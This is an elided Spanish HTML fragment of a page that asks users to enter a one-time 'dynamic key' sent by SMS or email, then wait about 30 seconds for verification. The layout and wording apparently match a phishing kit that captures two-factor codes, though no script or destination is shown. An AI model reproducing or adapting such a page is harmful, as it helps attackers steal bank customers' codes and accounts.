   		...
   		<div class="contenido">
   			...
   			<div class="cuerpo">
   				<div class="pnlizq">
   					<div class="formulario">
   						...
   						<div class="descripcion">
   							INGRESA LA CLAVE DINAMICA QUE TE LLEGO POR MENSAJE DE TEXTO "SMS" O A TU CORREO ELECTRONICO
   						</div>
   						<div class="form-cuerpo">
   							<div style="text-align: left;">
   								<img src="img/info.jpg" class="icon-info"><span class="etiqueta"> Ingrese su Clave Dinámica</span>
   							</div>   						
   				...
   				<div class="pnlder">
   					...
   					<div class="texto" style="text-align:justify; padding: 0px 30px;">Después de presionar verificar, te llevaremos a una página donde tendrás que esperar aproximadamente 30 segundos, de ser válida continuaremos con el siguiente paso. De lo contrario solicitaremos los datos nuevamente.</div>
   				</div>
   			</div>
   			<div class="pie">
